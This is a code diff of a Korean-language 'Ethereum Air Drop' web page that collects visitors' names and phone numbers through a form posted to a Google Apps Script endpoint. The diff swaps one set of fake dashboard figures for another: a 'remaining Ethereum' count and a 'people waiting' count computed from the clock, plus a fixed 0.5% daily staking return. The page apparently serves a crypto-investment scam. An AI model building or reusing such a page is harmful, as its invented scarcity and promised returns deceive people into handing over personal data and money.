@@ -139,7 +139,7 @@
         <div class="container py-5 mt-5">
             <div class="row align-items-center py-5 mt-5">
                 <div style="margin: 0 auto;" class="col-md-5 offset-md-1">
-                    <form class="hero-form p-5" id="폼" method="POST" data-email="g70632586@gmail.com" action="구글키">
+                    <form class="hero-form p-5" id="폼" method="POST" data-email="g70632586@gmail.com" action="https://script.google.com/macros/s/AKfycbyhqGXTd26HXS_6P-tNf6rmd43733MdH5uaVuTDv6tvM5NdWCv5k7wDDoeqLrCu74o/exec">
                         <h2 style="color: #a374db; font-weight: bold; text-align: center;">이더리움 에어드랍</h2>
                         <div class="mb-4">
                             <label for="exampleInputEmail1" class="form-label mb-0" style="font-weight: bold; font-size: 18px;">성함</label>
@@ -188,8 +188,8 @@ Ethereum Air Drop(이하 회사)은 고객님의 개인정보를 중요시하며
                                 if(E_name.value == null || E_name.value == "" || E_name.value == " " || E_num.value == null || E_num.value == "" || E_num.value == " ") {
                                     alert("성함과 전화번호를 정상적으로 작성하셔야합니다.");    
                                 } else {
-                                    alert("상담 신청이 정상적으로 완료되었습니다. \n빠른 시일 내에 연락드리겠습니다.");
                                     form.submit();
+                                    alert("상담 신청이 정상적으로 완료되었습니다. \n빠른 시일 내에 연락드리겠습니다.");
                                 }
                             }
                         </script>
@@ -204,26 +204,19 @@ Ethereum Air Drop(이하 회사)은 고객님의 개인정보를 중요시하며
     </section>
     <section id="testimonial" class=" position-relative  py-5">
         <div class="datadiv">Ethereum Air Drop</div>
-        <div class="datadiv"><span>누적 회원 수 : </span><span id="member"></span><span>명</span></div>
-        <div class="datadiv"><span>평균 수익률 : </span><span style="color: green" id="profit_avg"></span><span>%</span></div>
-        <div class="datadiv"><span>누적 회원 수익률 : </span><span style="color: red" id="profit_acc"></span><span>%</span></div>
-        <div class="datadiv"><span>남은 이더리움 수량 : </span><span style="color: gold" id="stock"></span><span>개</span></div>
-        <div class="datadiv"><span>상담 대기 인원 : </span><span id="waiting"></span><span>명</span></div>
+        <div class="datadiv"><span>남은 이더리움 수량 : </span><span style="color: gold" id="coin"></span><span>개</span></div>
+        <div class="datadiv"><span>스테이킹 1일 수익률 : </span><span style="color: green" id="profit_day"></span><span>%</span></div>
+        <div class="datadiv"><span>스테이킹 1개월 수익률 : </span><span style="color: aquamarine" id="profit_month"></span><span>%</span></div>
+        <div class="datadiv"><span>상담 대기 인원 : </span><span id="waiting" style="color: red"></span><span>명</span></div>
         <script>
             let date = new Date();
-            let member = Math.floor((date.getTime() / 1000) % 36000000 / 1000);
-            let profit = date.getTime() / 1000 / 3600 / 10000 + 50;
-            let profit_avg = profit.toFixed(2);
-            let profit_acc = (profit * member).toFixed(2);
-            let stock = 1500 - Math.floor((date.getTime() / 10000) % 1000);
+            let coin = 1500 - Math.floor((date.getTime() / 10000) % 1000);
+            let profit_day = 0.5;
+            let profit_month = (profit_day * 30).toFixed(2);
             let waiting = Math.floor((date.getTime() / 1000) % 50) + 50;
-            member = member.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-            profit_acc = profit_acc.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-            stock = stock.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-            document.getElementById("member").innerText = `${member}`;
-            document.getElementById("profit_avg").innerText = `${profit_avg}`;
-            document.getElementById("profit_acc").innerText = `${profit_acc}`;
-            document.getElementById("stock").innerText = `${stock}`;
+            document.getElementById("coin").innerText = `${coin}`;
+            document.getElementById("profit_day").innerText = `${profit_day}`;
+            document.getElementById("profit_month").innerText = `${profit_month}`;
             document.getElementById("waiting").innerText = `${waiting}`;
         </script>
     </section>
